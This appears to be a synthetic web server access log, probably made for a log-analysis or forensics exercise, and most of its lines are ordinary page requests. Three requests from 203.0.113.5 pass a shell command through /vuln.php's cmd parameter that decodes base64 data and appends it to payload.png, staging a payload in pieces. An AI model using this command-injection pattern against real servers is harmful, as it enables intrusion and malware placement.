192.168.1.12 - - [02/Sep/2025:19:14:55 +0700] "GET /news.php?page=2 HTTP/1.1" 200 9997 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:22:18:52 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 10420 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:19:11:48 +0700] "GET /blog/post2 HTTP/1.1" 200 2719 "-" "Chrome/120.0"
198.51.100.27 - - [02/Sep/2025:19:55:48 +0700] "GET /images/banner.png HTTP/1.1" 200 5777 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:23:00:20 +0700] "GET /about.php HTTP/1.1" 200 4621 "-" "Bingbot/2.0"
192.168.1.12 - - [02/Sep/2025:20:02:20 +0700] "GET /cart.php HTTP/1.1" 200 4007 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:21:07:52 +0700] "GET /products.php?id=12 HTTP/1.1" 200 7845 "-" "Edge/18.18363"
198.51.100.27 - - [02/Sep/2025:19:51:48 +0700] "GET /contact.php HTTP/1.1" 200 968 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:19:04:23 +0700] "GET /news.php?page=2 HTTP/1.1" 200 11512 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:19:14:02 +0700] "GET /blog/post1 HTTP/1.1" 200 8324 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:20:31:39 +0700] "GET /assets/main.js HTTP/1.1" 200 2929 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.13 - - [02/Sep/2025:20:51:21 +0700] "GET /cart.php HTTP/1.1" 200 7744 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:20:30:42 +0700] "GET /blog/post1 HTTP/1.1" 200 3567 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:21:26:00 +0700] "GET /checkout.php HTTP/1.1" 200 710 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:19:19:11 +0700] "GET /blog/post1 HTTP/1.1" 200 1096 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:19:23:06 +0700] "GET /favicon.ico HTTP/1.1" 200 5533 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:19:45:12 +0700] "GET /about.php HTTP/1.1" 200 288 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:20:01:48 +0700] "GET /login.php HTTP/1.1" 200 8237 "-" "Chrome/120.0"
192.168.1.12 - - [02/Sep/2025:21:27:05 +0700] "GET /blog/post3 HTTP/1.1" 200 8710 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:19:12:42 +0700] "GET /cart.php HTTP/1.1" 200 9297 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:19:40:40 +0700] "GET /api/data?id=42 HTTP/1.1" 200 1579 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:21:07:51 +0700] "GET /dashboard.php HTTP/1.1" 200 623 "-" "Bingbot/2.0"
192.168.1.12 - - [02/Sep/2025:19:09:15 +0700] "GET /about.php HTTP/1.1" 200 10204 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:19:18:16 +0700] "GET /news.php?page=2 HTTP/1.1" 200 7576 "-" "Chrome/120.0"
192.168.1.12 - - [02/Sep/2025:20:15:56 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 5256 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:19:28:49 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 6070 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:22:55:45 +0700] "GET /checkout.php HTTP/1.1" 200 9555 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
198.51.100.27 - - [02/Sep/2025:21:43:36 +0700] "GET /robots.txt HTTP/1.1" 200 5558 "-" "Chrome/120.0"
192.168.1.11 - - [02/Sep/2025:19:28:54 +0700] "GET /cart.php HTTP/1.1" 200 8425 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:20:00:04 +0700] "GET /sitemap.xml HTTP/1.1" 200 3741 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:21:19:18 +0700] "GET /contact.php HTTP/1.1" 200 9991 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:20:18:51 +0700] "GET /blog/post3 HTTP/1.1" 200 439 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:20:32:52 +0700] "GET /blog/post2 HTTP/1.1" 200 7878 "-" "Mozilla/5.0"
192.168.1.11 - - [02/Sep/2025:21:51:56 +0700] "GET /products.php?id=12 HTTP/1.1" 200 5762 "-" "Mozilla/5.0"
192.168.1.11 - - [02/Sep/2025:19:20:50 +0700] "GET /api/data?id=42 HTTP/1.1" 200 938 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:20:19:52 +0700] "GET /cart.php HTTP/1.1" 200 11861 "-" "Chrome/120.0"
203.0.113.5 - - [02/Sep/2025:19:09:24 +0700] "GET /vuln.php?cmd=echo%20o4Wnoy9Hf0R0bvtCjJyX2mLTM7lQdfr06XhpW2d2AapSz/W5LHblt2uX894xG7wD07ktXsrXa+71zAi/t0rq3/cHarMsbt/WGRH98fKIB0UAijUsWrQoWlpaYu7cudmyOnE0dl6xMt/kZehO0ODrscI13bzDG/NN7dbFYyUnZ6fj9Evbop5Oq2A2Ofpyf+43/IVNUTYnAZOqrf13srMAGEXDTTfdFHv27IlXX301W1YfDm/PN+1ZF4+VuzK9bFecLrqce/hgPmJtuz2GXeRt2xTPPDNFJ21lmg6ONvBESQfeYa/yfUKqUW79Zbcnv925sqE=%20|base64%20-d%20>>%20payload.png HTTP/1.1" 200 512 "-" "curl/7.88"
198.51.100.27 - - [02/Sep/2025:19:05:00 +0700] "GET /login.php HTTP/1.1" 200 11453 "-" "Edge/18.18363"
192.168.1.11 - - [02/Sep/2025:22:30:40 +0700] "GET /robots.txt HTTP/1.1" 200 9676 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:19:16:08 +0700] "GET /assets/app.js HTTP/1.1" 200 4773 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:21:57:00 +0700] "GET /dashboard.php HTTP/1.1" 200 5354 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:19:07:11 +0700] "GET /checkout.php HTTP/1.1" 200 457 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
198.51.100.27 - - [02/Sep/2025:19:53:58 +0700] "GET /images/banner.png HTTP/1.1" 200 10662 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:19:56:10 +0700] "GET /news.php?page=2 HTTP/1.1" 200 1974 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.13 - - [02/Sep/2025:20:22:44 +0700] "GET /about.php HTTP/1.1" 200 4655 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.13 - - [02/Sep/2025:21:01:51 +0700] "GET /cart.php HTTP/1.1" 200 8337 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
198.51.100.27 - - [02/Sep/2025:19:34:22 +0700] "GET /products.php?id=12 HTTP/1.1" 200 2842 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:19:23:32 +0700] "GET /assets/main.js HTTP/1.1" 200 11694 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:19:06:21 +0700] "GET /assets/app.js HTTP/1.1" 200 8962 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:20:55:09 +0700] "GET /cart.php HTTP/1.1" 200 2815 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:19:13:56 +0700] "GET /products.php?id=12 HTTP/1.1" 200 853 "-" "Chrome/120.0"
192.168.1.11 - - [02/Sep/2025:20:59:48 +0700] "GET /assets/main.js HTTP/1.1" 200 4809 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:19:41:40 +0700] "GET /dashboard.php HTTP/1.1" 200 292 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:19:33:20 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 6804 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:19:32:48 +0700] "GET /dashboard.php HTTP/1.1" 200 5899 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:20:46:24 +0700] "GET /assets/app.js HTTP/1.1" 200 1646 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:20:45:56 +0700] "GET /assets/main.js HTTP/1.1" 200 9325 "-" "Chrome/120.0"
198.51.100.27 - - [02/Sep/2025:19:39:03 +0700] "GET /blog/post2 HTTP/1.1" 200 10392 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:19:43:16 +0700] "GET /blog/post2 HTTP/1.1" 200 3292 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.13 - - [02/Sep/2025:21:54:16 +0700] "GET /about.php HTTP/1.1" 200 8293 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:19:55:00 +0700] "GET /blog/post1 HTTP/1.1" 200 4194 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:20:02:30 +0700] "GET /contact.php HTTP/1.1" 200 6077 "-" "Edge/18.18363"
192.168.1.12 - - [02/Sep/2025:20:44:44 +0700] "GET /favicon.ico HTTP/1.1" 200 3482 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:20:03:16 +0700] "GET /blog/post3 HTTP/1.1" 200 7768 "-" "Edge/18.18363"
198.51.100.27 - - [02/Sep/2025:20:06:35 +0700] "GET /blog/post2 HTTP/1.1" 200 2432 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:21:27:00 +0700] "GET /images/banner.png HTTP/1.1" 200 2114 "-" "Chrome/120.0"
198.51.100.27 - - [02/Sep/2025:20:18:30 +0700] "GET /assets/main.js HTTP/1.1" 200 2702 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:20:48:45 +0700] "GET /news.php?page=2 HTTP/1.1" 200 6293 "-" "Edge/18.18363"
192.168.1.12 - - [02/Sep/2025:21:09:57 +0700] "GET /about.php HTTP/1.1" 200 351 "-" "Chrome/120.0"
198.51.100.27 - - [02/Sep/2025:21:20:30 +0700] "GET /news.php?page=2 HTTP/1.1" 200 5950 "-" "Chrome/120.0"
192.168.1.11 - - [02/Sep/2025:22:51:45 +0700] "GET /about.php HTTP/1.1" 200 9174 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:19:34:32 +0700] "GET /contact.php HTTP/1.1" 200 1076 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:21:03:48 +0700] "GET /assets/main.js HTTP/1.1" 200 6884 "-" "Mozilla/5.0"
192.168.1.13 - - [02/Sep/2025:19:12:55 +0700] "GET /robots.txt HTTP/1.1" 200 7736 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:20:48:25 +0700] "GET /sitemap.xml HTTP/1.1" 200 11718 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:21:29:40 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 7758 "-" "Chrome/120.0"
192.168.1.11 - - [02/Sep/2025:20:21:10 +0700] "GET /login.php HTTP/1.1" 200 3441 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:19:06:58 +0700] "GET /index.php HTTP/1.1" 200 2671 "-" "Edge/18.18363"
192.168.1.11 - - [02/Sep/2025:22:09:10 +0700] "GET /products.php?id=12 HTTP/1.1" 200 11704 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
198.51.100.27 - - [02/Sep/2025:19:37:00 +0700] "GET /login.php HTTP/1.1" 200 5396 "-" "Edge/18.18363"
192.168.1.12 - - [02/Sep/2025:19:24:22 +0700] "GET /products.php?id=12 HTTP/1.1" 200 7551 "-" "Bingbot/2.0"
192.168.1.10 - - [02/Sep/2025:19:41:26 +0700] "GET /blog/post3 HTTP/1.1" 200 1864 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:19:53:52 +0700] "GET /login.php HTTP/1.1" 200 321 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:19:40:46 +0700] "GET /api/data?id=42 HTTP/1.1" 200 10750 "-" "Chrome/120.0"
192.168.1.12 - - [02/Sep/2025:19:59:42 +0700] "GET /login.php HTTP/1.1" 200 1541 "-" "Edge/18.18363"
192.168.1.12 - - [02/Sep/2025:20:16:54 +0700] "GET /blog/post2 HTTP/1.1" 200 5508 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:19:27:50 +0700] "GET /assets/app.js HTTP/1.1" 200 4362 "-" "Mozilla/5.0"
192.168.1.13 - - [02/Sep/2025:19:39:16 +0700] "GET /news.php?page=2 HTTP/1.1" 200 4513 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
198.51.100.27 - - [02/Sep/2025:20:55:57 +0700] "GET /cart.php HTTP/1.1" 200 3275 "-" "Chrome/120.0"
192.168.1.12 - - [02/Sep/2025:19:34:00 +0700] "GET /api/data?id=42 HTTP/1.1" 200 405 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:20:52:24 +0700] "GET /assets/style.css HTTP/1.1" 200 8261 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:20:58:33 +0700] "GET /about.php HTTP/1.1" 200 3828 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:21:23:20 +0700] "GET /news.php?page=2 HTTP/1.1" 200 9143 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:19:23:38 +0700] "GET /assets/main.js HTTP/1.1" 200 2401 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:20:10:26 +0700] "GET /checkout.php HTTP/1.1" 200 1865 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:20:14:52 +0700] "GET /assets/app.js HTTP/1.1" 200 11633 "-" "Mozilla/5.0"
192.168.1.11 - - [02/Sep/2025:19:01:48 +0700] "GET /cart.php HTTP/1.1" 200 4133 "-" "Mozilla/5.0"
192.168.1.11 - - [02/Sep/2025:22:05:52 +0700] "GET /products.php?id=12 HTTP/1.1" 200 9342 "-" "Mozilla/5.0"
192.168.1.13 - - [02/Sep/2025:19:04:41 +0700] "GET /blog/post2 HTTP/1.1" 200 10819 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:21:37:56 +0700] "GET /login.php HTTP/1.1" 200 10255 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:21:24:15 +0700] "GET /assets/style.css HTTP/1.1" 200 8018 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:21:59:56 +0700] "GET /contact.php HTTP/1.1" 200 3249 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:23:04:00 +0700] "GET /favicon.ico HTTP/1.1" 200 771 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:19:20:24 +0700] "GET /dashboard.php HTTP/1.1" 200 8742 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:20:51:24 +0700] "GET /favicon.ico HTTP/1.1" 200 5195 "-" "Mozilla/5.0"
192.168.1.11 - - [02/Sep/2025:19:01:15 +0700] "GET /blog/post3 HTTP/1.1" 200 9488 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:20:58:04 +0700] "GET /api/data?id=42 HTTP/1.1" 200 7355 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:19:01:44 +0700] "GET /checkout.php HTTP/1.1" 200 6662 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:21:45:08 +0700] "GET /contact.php HTTP/1.1" 200 3312 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:19:22:15 +0700] "GET /checkout.php HTTP/1.1" 200 4673 "-" "Edge/18.18363"
198.51.100.27 - - [02/Sep/2025:20:03:54 +0700] "GET /index.php HTTP/1.1" 200 11689 "-" "Mozilla/5.0"
192.168.1.11 - - [02/Sep/2025:19:46:03 +0700] "GET /robots.txt HTTP/1.1" 200 7685 "-" "Mozilla/5.0"
192.168.1.13 - - [02/Sep/2025:19:53:32 +0700] "GET /blog/post1 HTTP/1.1" 200 9694 "-" "Mozilla/5.0"
203.0.113.5 - - [02/Sep/2025:19:04:43 +0700] "GET /vuln.php?cmd=echo%20zu6510hNLqtYfzWO7owrRv1/C9tXpn4G/za1PTX2mal4/bWpuD5r/LyGL5vq6zdRaqz/apX5vMbn/6hm+3N1fsXOoyX7h42HS7ev3Odc8fchr9zyQ6/Kfi/l30O18vVTuPOf3S+O9J/Usj3ZdY/2N2WWHVaf47z/Kb8tVdTPWLYHgJpMch+n6o0ahMpoe0funlL/gd6Rm+RNspGaDvZv6Sjb7+rwxsboqLQjSA1GWn//lo6RT1xe3h5XNBbu/BXsjZVVbP+o669E26a4Y11ExN4o29f+8MHc9q27oyRgH915RTR2bInsFvVv6Rh+clSDiV4=%20|base64%20-d%20>>%20payload.png HTTP/1.1" 200 512 "-" "curl/7.88"
192.168.1.11 - - [02/Sep/2025:19:24:44 +0700] "GET /contact.php HTTP/1.1" 200 9197 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:20:54:24 +0700] "GET /assets/app.js HTTP/1.1" 200 10724 "-" "Chrome/120.0"
192.168.1.12 - - [02/Sep/2025:19:29:36 +0700] "GET /api/data?id=42 HTTP/1.1" 200 8197 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
198.51.100.27 - - [02/Sep/2025:19:56:06 +0700] "GET /blog/post1 HTTP/1.1" 200 6737 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:21:23:15 +0700] "GET /images/banner.png HTTP/1.1" 200 3175 "-" "Bingbot/2.0"
192.168.1.10 - - [02/Sep/2025:19:54:00 +0700] "GET /sitemap.xml HTTP/1.1" 200 2043 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:19:17:52 +0700] "GET /about.php HTTP/1.1" 200 3495 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:20:47:40 +0700] "GET /blog/post2 HTTP/1.1" 200 8451 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:19:17:42 +0700] "GET /assets/main.js HTTP/1.1" 200 9015 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
198.51.100.27 - - [02/Sep/2025:19:42:14 +0700] "GET /favicon.ico HTTP/1.1" 200 5107 "-" "Bingbot/2.0"
192.168.1.10 - - [02/Sep/2025:20:59:00 +0700] "GET /products.php?id=12 HTTP/1.1" 200 7843 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:22:03:55 +0700] "GET /images/banner.png HTTP/1.1" 200 310 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:20:52:48 +0700] "GET /products.php?id=12 HTTP/1.1" 200 1918 "-" "Mozilla/5.0"
192.168.1.11 - - [02/Sep/2025:20:25:45 +0700] "GET /favicon.ico HTTP/1.1" 200 7493 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:19:40:44 +0700] "GET /cart.php HTTP/1.1" 200 7785 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:20:59:21 +0700] "GET /assets/main.js HTTP/1.1" 200 4923 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:19:12:00 +0700] "GET /assets/main.js HTTP/1.1" 200 238 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:21:14:40 +0700] "GET /cart.php HTTP/1.1" 200 10531 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
198.51.100.27 - - [02/Sep/2025:19:48:03 +0700] "GET /blog/post1 HTTP/1.1" 200 5320 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.13 - - [02/Sep/2025:20:08:10 +0700] "GET /cart.php HTTP/1.1" 200 1981 "-" "Mozilla/5.0"
192.168.1.13 - - [02/Sep/2025:19:56:16 +0700] "GET /sitemap.xml HTTP/1.1" 200 1645 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:22:15:50 +0700] "GET /assets/style.css HTTP/1.1" 200 7921 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:19:56:27 +0700] "GET /dashboard.php HTTP/1.1" 200 3197 "-" "Mozilla/5.0"
192.168.1.13 - - [02/Sep/2025:22:42:05 +0700] "GET /sitemap.xml HTTP/1.1" 200 5734 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:21:09:28 +0700] "GET /blog/post1 HTTP/1.1" 200 4841 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:19:45:10 +0700] "GET /images/banner.png HTTP/1.1" 200 2259 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:19:29:14 +0700] "GET /dashboard.php HTTP/1.1" 200 3195 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:19:46:38 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 10449 "-" "Chrome/120.0"
203.0.113.5 - - [02/Sep/2025:19:09:28 +0700] "GET /vuln.php?cmd=echo%20f031WcXnlTs5yy47DjIni7mfQH9s6Sg9gRzxPUyUwxvLfl57V07BtkT+syraP+w9uDN23jK0ff1btpecGFf7fRhp+RFNUv30ltsv7l05/DdT9fbkw0d23RGxd+XwEFHx/rnG/U/125+TrJ9atweAmtV5cDoarzwfEdEZNy6vbM/ftvzGXHO8/i3RUdWVtqOx867cQep32iv7vyoy2HQw08yw0Gywf0tsLz7oHd0Zuc3ILF9okti5LV4qd+etSp3bXiptxljoKLz3rrJ11r93b/SXbNPoHYurXX+llq3K1UO5UcoKIbu0I/7R6D2QbyKWaeY=%20|base64%20-d%20>>%20payload.png HTTP/1.1" 200 512 "-" "curl/7.88"
198.51.100.27 - - [02/Sep/2025:19:29:02 +0700] "GET /robots.txt HTTP/1.1" 200 6500 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:22:02:20 +0700] "GET /login.php HTTP/1.1" 200 11507 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:19:10:40 +0700] "GET /blog/post2 HTTP/1.1" 200 5322 "-" "Edge/18.18363"
192.168.1.11 - - [02/Sep/2025:19:41:18 +0700] "GET /blog/post1 HTTP/1.1" 200 10184 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:21:11:57 +0700] "GET /news.php?page=2 HTTP/1.1" 200 9802 "-" "Mozilla/5.0"
192.168.1.11 - - [02/Sep/2025:19:38:17 +0700] "GET /robots.txt HTTP/1.1" 200 9063 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:19:28:42 +0700] "GET /assets/main.js HTTP/1.1" 200 6453 "-" "Edge/18.18363"
192.168.1.12 - - [02/Sep/2025:20:24:00 +0700] "GET /cart.php HTTP/1.1" 200 543 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:19:17:47 +0700] "GET /dashboard.php HTTP/1.1" 200 9172 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:19:01:42 +0700] "GET /products.php?id=12 HTTP/1.1" 200 1184 "-" "Bingbot/2.0"
192.168.1.12 - - [02/Sep/2025:21:24:00 +0700] "GET /contact.php HTTP/1.1" 200 8853 "-" "Chrome/120.0"
192.168.1.12 - - [02/Sep/2025:19:45:14 +0700] "GET /blog/post3 HTTP/1.1" 200 9474 "-" "Mozilla/5.0"
192.168.1.13 - - [02/Sep/2025:19:58:56 +0700] "GET /checkout.php HTTP/1.1" 200 5514 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:21:55:05 +0700] "GET /sitemap.xml HTTP/1.1" 200 6416 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:22:32:05 +0700] "GET /cart.php HTTP/1.1" 200 10911 "-" "Bingbot/2.0"
192.168.1.10 - - [02/Sep/2025:22:29:45 +0700] "GET /news.php?page=2 HTTP/1.1" 200 6971 "-" "Chrome/120.0"
192.168.1.11 - - [02/Sep/2025:19:05:18 +0700] "GET /api/data?id=42 HTTP/1.1" 200 571 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:21:01:20 +0700] "GET /login.php HTTP/1.1" 200 8333 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:19:33:48 +0700] "GET /contact.php HTTP/1.1" 200 11858 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:19:48:14 +0700] "GET /news.php?page=2 HTTP/1.1" 200 2037 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:20:16:58 +0700] "GET /index.php HTTP/1.1" 200 9328 "-" "Mozilla/5.0"
192.168.1.11 - - [02/Sep/2025:20:25:48 +0700] "GET /checkout.php HTTP/1.1" 200 8602 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:21:53:35 +0700] "GET /cart.php HTTP/1.1" 200 7384 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:19:10:58 +0700] "GET /checkout.php HTTP/1.1" 200 7384 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:21:58:45 +0700] "GET /dashboard.php HTTP/1.1" 200 7666 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
198.51.100.27 - - [02/Sep/2025:21:12:40 +0700] "GET /images/banner.png HTTP/1.1" 200 6521 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:19:09:15 +0700] "GET /api/data?id=42 HTTP/1.1" 200 8916 "-" "Edge/18.18363"
192.168.1.11 - - [02/Sep/2025:19:57:00 +0700] "GET /blog/post2 HTTP/1.1" 200 2271 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:19:13:26 +0700] "GET /favicon.ico HTTP/1.1" 200 1985 "-" "Mozilla/5.0"
192.168.1.13 - - [02/Sep/2025:20:46:28 +0700] "GET /login.php HTTP/1.1" 200 6488 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:20:46:09 +0700] "GET /products.php?id=12 HTTP/1.1" 200 10474 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
198.51.100.27 - - [02/Sep/2025:19:33:06 +0700] "GET /assets/style.css HTTP/1.1" 200 10289 "-" "Edge/18.18363"
192.168.1.11 - - [02/Sep/2025:19:04:48 +0700] "GET /news.php?page=2 HTTP/1.1" 200 8470 "-" "Mozilla/5.0"
192.168.1.13 - - [02/Sep/2025:19:45:58 +0700] "GET /checkout.php HTTP/1.1" 200 3022 "-" "Chrome/120.0"
198.51.100.27 - - [02/Sep/2025:19:00:03 +0700] "GET /login.php HTTP/1.1" 200 2090 "-" "Bingbot/2.0"
192.168.1.11 - - [02/Sep/2025:22:13:08 +0700] "GET /images/banner.png HTTP/1.1" 200 6492 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:22:11:52 +0700] "GET /favicon.ico HTTP/1.1" 200 5689 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:19:18:44 +0700] "GET /assets/main.js HTTP/1.1" 200 5352 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.13 - - [02/Sep/2025:19:05:06 +0700] "GET /blog/post3 HTTP/1.1" 200 4103 "-" "Chrome/120.0"
198.51.100.27 - - [02/Sep/2025:22:54:20 +0700] "GET /about.php HTTP/1.1" 200 6461 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:21:45:20 +0700] "GET /sitemap.xml HTTP/1.1" 200 9090 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.13 - - [02/Sep/2025:19:15:28 +0700] "GET /dashboard.php HTTP/1.1" 200 10426 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:20:40:21 +0700] "GET /dashboard.php HTTP/1.1" 200 10228 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:20:33:32 +0700] "GET /index.php HTTP/1.1" 200 1086 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
198.51.100.27 - - [02/Sep/2025:21:19:36 +0700] "GET /login.php HTTP/1.1" 200 7139 "-" "Bingbot/2.0"
192.168.1.10 - - [02/Sep/2025:19:58:51 +0700] "GET /favicon.ico HTTP/1.1" 200 3999 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:21:29:28 +0700] "GET /assets/main.js HTTP/1.1" 200 7258 "-" "Edge/18.18363"
198.51.100.27 - - [02/Sep/2025:19:02:26 +0700] "GET /images/banner.png HTTP/1.1" 200 5134 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:19:55:46 +0700] "GET /blog/post2 HTTP/1.1" 200 8702 "-" "Safari/537.36"
198.51.100.27 - - [02/Sep/2025:19:27:12 +0700] "GET /assets/app.js HTTP/1.1" 200 2644 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:19:25:54 +0700] "GET /checkout.php HTTP/1.1" 200 11870 "-" "Mozilla/5.0"
